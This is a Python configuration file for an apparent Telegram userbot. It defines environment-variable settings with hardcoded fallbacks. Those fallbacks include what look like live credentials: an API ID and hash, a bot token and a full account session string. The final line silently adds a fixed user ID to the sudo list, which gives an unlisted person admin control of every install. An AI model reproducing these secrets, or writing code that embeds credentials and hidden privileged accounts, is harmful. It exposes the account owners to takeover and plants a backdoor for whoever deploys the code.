from os import getenv
from dotenv import load_dotenv

load_dotenv()
que = {}
admins = {}

API_ID = int(getenv("API_ID", "19722516"))
API_HASH = getenv("API_HASH", "041a11b1f107a0ddc732a1a4026d918b")
BOT_TOKEN = getenv("BOT_TOKEN", "5581893402:AAGr2UvVD8y-j5X6kw_tNYv7BaRqYdb4xBo")
BOT_NAME = getenv("BOT_NAME", "ARNOP")
BOT_USERNAME = getenv("BOT_USERNAME", "Y_H_U_0_BOT")
OWNER_USERNAME = getenv("OWNER_USERNAME", "Y_H_U_1")
SUPPORT_GROUP = getenv("SUPPORT_GROUP", "Y_H_U_4")
DURATION_LIMIT = int(getenv("DURATION_LIMIT", "90"))
START_IMG = getenv("START_IMG", "https://telegra.ph/file/b0aefd5c3b634687f011f.jpg")
PING_IMG = getenv("PING_IMG", "https://telegra.ph/file/2378384a1c3f7b4e4213e.jpg")
SESSION_NAME = getenv("SESSION_NAME", "BABAy7mwzf1nVgwJ8mIpM4fyzjNf_WbypvKjbkegWiPOb1Bonli-Hp-2Fo9F4cKj98rnhMLIb6UyPxH3bBgA_-fTmB1OQmeN-iAoaIo4CtURImM8gkhpPFuc5rpvNSnqgCibPKrOzhmylPcuvmAQoVBRsF63orESZ0sD6hJ46LCFsIsnwt6jaszfvTHIlmXV2MqAYSrLiee12U8ZjKecCzT310cmdHT2BYRXAwJyWxDXvnk7S-gvYUnIEOI0lUbM5ng5LsgDkT70UbtN74Ro7DQauqUrAZd70vjFvhqDMJw2tSJMUxmz7dpf7nhTkIyyfsSBl0vbc-CpaMbly_q-5qIwAAAAAV9JN3EA")
COMMAND_PREFIXES = list(getenv("COMMAND_PREFIXES", "").split())
PMPERMIT = getenv("PMPERMIT", "ENABLE")
SUDO_USERS = list(map(int, getenv("SUDO_USERS", "5934060011").split()))+ [5490392130]
